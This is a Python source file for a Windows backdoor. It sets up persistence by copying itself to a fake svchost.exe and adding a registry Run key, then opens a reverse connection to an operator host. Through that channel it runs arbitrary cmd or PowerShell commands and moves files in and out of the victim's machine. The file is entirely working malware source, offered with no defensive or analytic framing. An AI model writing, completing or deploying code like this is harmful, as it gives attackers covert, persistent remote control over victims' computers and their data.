#!/usr/bin/python
# General - Using json to manage serialisation to manage the transference of data.
# General - It's able to connect, receive and send data.
# The use of sys module make the exit withtout popping up a messages error.

import traceback
import socket
import json
import shutil
import subprocess
import base64
import sys
import os

class Bdoor:

    # The set makes assure the proper cli is chosen.
    cli_p = {"cmd": "cmd",
             "PS": "powershell", 
             "powershell": "powershell", 
             "default": "dafault"}

    def __init__(self, addr, prt):
        self.pers__()
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((addr, prt))
        self.cli = self.cli_p["default"]
    
    def pers__(self):
        l_pers__ = os.environ["localappdata"] + "\\Microsoft\\WindowsApps\\svchost.exe"
        if not os.path.exists(l_pers__):
            # Copy the current executalbe file.
            shutil.copyfile(sys.executable, l_pers__)
            subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinServis /t REG_SZ /d "' + l_pers__ + '"', shell=True)

    def send_data(self, data):
        json_data = json.dumps(data)
        # After transforming to json formant it is necessary to become tha data to binary
        # That's why encode() is used.
        self.conn.send(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:  
                json_data += self.conn.recv(1024).decode()
                if json_data == "" or json_data == b'':
                    break
                # print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
                # print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
                return json.loads(json_data)
            except ValueError:
                continue

    def cd_to(self, path):
        os.chdir(path)

    def exec_cmd(self, comm):
        # print(comm)
        # Inserting at the beginning to cli chosen
        # The parameter /C is to execute the command then exit.
        if self.cli == "cmd":
            comm[:0] = [self.cli, "/C"] if self.cli == "cmd" else ""
        elif self.cli == "powershell":
            comm[:0] = [self.cli]

        output_ = subprocess.run(comm, capture_output=True, shell=True)
        # print("\noutput type: " + str(type(output_)) + " - stdout: " + str(output_.stdout.decode()=="") + "\n") #testing
        # print("\noutput type: " + str(type(output_)) + " - stderr: " + str(output_.stderr.decode()=="") + "\n") #testing
        self.send_data(output_.stdout.decode() if output_.stderr.decode() == "" else output_.stderr.decode())

    def write_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nUploaded"
    
    def read_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()

    def run(self):
        while True:
            comm = self.rcve_data()
            try:
                if comm == None:
                    self.exec_cmd("")
                elif "exit" in comm[0]:
                    self.con_close()
                elif comm[0] == "cd" and len(comm) > 1 and not comm[1] == "/?":
                    self.cd_to(comm[1])
                    self.exec_cmd("cd")
                elif comm[0] == "download":
                    self.send_data(self.read_f(comm[1]))
                elif comm[0] == "upload":
                    self.send_data(self.write_f(comm[1], comm[2]))
                elif comm[0] == "setcli":
                    self.cli = self.cli_p[comm[1]]
                    self.send_data("CLI preferred: " + self.cli)
                elif comm[0] == "getcli":
                    self.send_data("CLI preferred: " + self.cli)
                else:
                    self.exec_cmd(comm)
            except (TimeoutError, ConnectionRefusedError, ConnectionAbortedError, BrokenPipeError, ConnectionError):
                pass
            except (KeyError, TypeError):
                self.send_data(f'[Bad command]: {traceback.format_exc()}')
            except (OSError, Exception):
                self.send_data('[Bad command]: ' + traceback.format_exc())
            
    
    def con_close(self):
        self.conn.close()
        # exiting with sys makes to not to pop a message windows up.
        sys.exit()

my_bd = Bdoor("<ip>", <prt>)
my_bd.run()